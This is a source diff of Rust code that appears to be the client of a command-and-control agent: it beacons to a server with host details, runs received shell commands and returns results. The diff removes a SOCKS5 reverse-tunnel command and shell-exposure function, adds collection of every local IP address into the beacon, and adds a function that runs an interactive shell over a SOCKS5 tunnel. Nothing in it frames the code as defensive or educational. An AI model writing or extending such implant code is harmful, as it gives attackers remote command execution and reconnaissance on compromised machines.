@@ -1,4 +1,4 @@
-use std::io::{self, ErrorKind, Read};
+use std::io::{self, Read};
 use std::process::Command;
 use std::fs;
 use std::path::Path;
@@ -6,10 +6,10 @@ use serde_json::json;
 use hostname;
 use os_info;
 use std::net::UdpSocket;
-use crate::networking::socks5::Socks5Client;
-use std::time::Duration;
+use tokio::net::TcpStream;
+use tokio::io::{AsyncReadExt, AsyncWriteExt, split};
 use crate::networking::socks5::socks5_bind;
-
+use get_if_addrs::get_if_addrs;
 
 #[cfg(windows)]
 fn create_command(command: &str, args: &[&str]) -> Command {
@@ -81,34 +81,6 @@ async fn execute_command(cmd_parts: &[&str]) -> io::Result<String> {
 
     // Handle special commands
     match cmd_parts[0] {
-        "socks5_tunnel" => {
-            if cmd_parts.len() != 4 {
-                return Err(io::Error::new(ErrorKind::InvalidInput, 
-                    "Usage: socks5_tunnel <proxy_host> <proxy_port> <local_port>"));
-            }
-            
-            let proxy_host = cmd_parts[1].to_string();
-            let proxy_port = cmd_parts[2].parse::<u16>()
-                .map_err(|e| io::Error::new(ErrorKind::InvalidInput, format!("Invalid proxy port: {}", e)))?;
-            let local_port = cmd_parts[3].parse::<u16>()
-                .map_err(|e| io::Error::new(ErrorKind::InvalidInput, format!("Invalid local port: {}", e)))?;
-
-            // Create SOCKS5 client
-            let client = Socks5Client::new(proxy_host.clone(), proxy_port)
-                .with_timeout(Duration::from_secs(30));
-
-            // Start tunnel in background task
-            tokio::spawn(async move {
-                println!("[SOCKS5] Starting reverse tunnel to {}:{} on local port {}", 
-                    proxy_host, proxy_port, local_port);
-                
-                if let Err(e) = client.start_reverse_tunnel(local_port).await {
-                    println!("[ERROR] Reverse tunnel failed: {}", e);
-                }
-            });
-
-            return Ok(format!("Started SOCKS5 reverse tunnel on local port {}", local_port));
-        },
         _ => {
             // Handle regular shell commands
             let output = if cfg!(windows) {
@@ -142,6 +114,30 @@ fn get_local_ip() -> io::Result<String> {
     Ok(addr.ip().to_string())
 }
 
+/// Gather all non-loopback, non-point-to-point IP addresses
+fn get_all_local_ips() -> Vec<String> {
+    let mut ips = Vec::new();
+    if let Ok(ifaces) = get_if_addrs() {
+        for iface in ifaces {
+            match iface.addr {
+                get_if_addrs::IfAddr::V4(v4) => {
+                    let ip = v4.ip.to_string();
+                    if !v4.ip.is_loopback() {
+                        ips.push(ip);
+                    }
+                }
+                get_if_addrs::IfAddr::V6(v6) => {
+                    let ip = v6.ip.to_string();
+                    if !v6.ip.is_loopback() {
+                        ips.push(ip);
+                    }
+                }
+            }
+        }
+    }
+    ips
+}
+
 async fn send_heartbeat(server_addr: &str, agent_id: &str) -> io::Result<()> {
     let url = format!("{}/api/agent/{}/heartbeat", server_addr, agent_id);
     println!("[DEBUG] Sending heartbeat to {} for agent {}", url, agent_id);
@@ -150,13 +146,15 @@ async fn send_heartbeat(server_addr: &str, agent_id: &str) -> io::Result<()> {
     let hostname = hostname::get()?
         .to_string_lossy()
         .to_string();
-    let ip = get_local_ip().unwrap_or_else(|_| "Unknown".to_string());
+    let ip_list = get_all_local_ips();
+    let ip = if ip_list.is_empty() { "Unknown".into() } else { ip_list.join(",") };
 
     let data = json!({
         "id": agent_id,
         "os": os.os_type().to_string(),
         "hostname": hostname,
         "ip": ip,
+        "ip_list": ip_list,
         "commands": Vec::<String>::new()
     });
 
@@ -215,49 +213,28 @@ async fn submit_result(server_addr: &str, agent_id: &str, command: &str, output:
     }
 }
 
-async fn expose_shell(port: u16, proxy_addr: &str, proxy_port: u16) -> io::Result<()> {
-    /*
-    // 1) request a BIND on the remote proxy
-    let mut inbound = socks5_bind(proxy_addr, proxy_port, port).await?;
-    println!("[SOCKS5] BIND established on {}:{}", proxy_addr, proxy_port);
-
-    // 2) tokio_socks will do the two‑reply for you; once it returns
-    //    you get a future that resolves when *your* listener gets an incoming
-    //    connect from the server operator.
-    let (mut inbound, _) = bind_stream.into_inner();
-    // 3) now inbound is your 2‑way channel from the server → agent shell
-    tokio::io::copy_bidirectional(&mut inbound, &mut inbound).await?;
-    Ok(())
-    */
-
-    let mut stream = socks5_bind(proxy_addr, proxy_port, port).await?;
-    println!("[SOCKS5] Reverse tunnel established via {}:{}", proxy_addr, proxy_port);
-
-    
-    // splitting tunnel into read/write halves
-    let (mut reader, mut writer) = tokio::io::split(stream);
+/// Runs an interactive shell over an existing SOCKS5 CONNECT tunnel.
+pub async fn run_shell_over_socks(
+    stream: TcpStream,
+    agent_id: &str,
+) -> io::Result<()> {
+    println!("[SOCKS5] Starting interactive shell for agent {}", agent_id);
+    let (mut rd, mut wr) = tokio::io::split(stream);
     let mut stdin = tokio::io::stdin();
     let mut stdout = tokio::io::stdout();
 
-    // pump local stdin -> remote, and remote -> local stdout
     let to_remote = tokio::spawn(async move {
-        tokio::io::copy(&mut stdin, &mut writer).await
+        tokio::io::copy(&mut stdin, &mut wr).await
     });
 
-    let to_local = tokio::spawn(async move {
-        tokio::io::copy(&mut reader, &mut stdout).await
+    let from_remote = tokio::spawn(async move {
+        tokio::io::copy(&mut rd, &mut stdout).await
     });
 
-    // wait until the either side closes
     tokio::select! {
-        _ = to_remote => {
-            println!("[SOCKS5] Local stdin closed");
-        }
-        _ = to_local => {
-            println!("[SOCKS5] Remote stream closed");
-        }
+        _ = to_remote => println!("[SOCKS5] Stdin closed"),
+        _ = from_remote => println!("[SOCKS5] Tunnel closed"),
     }
-
     Ok(())
 }
 
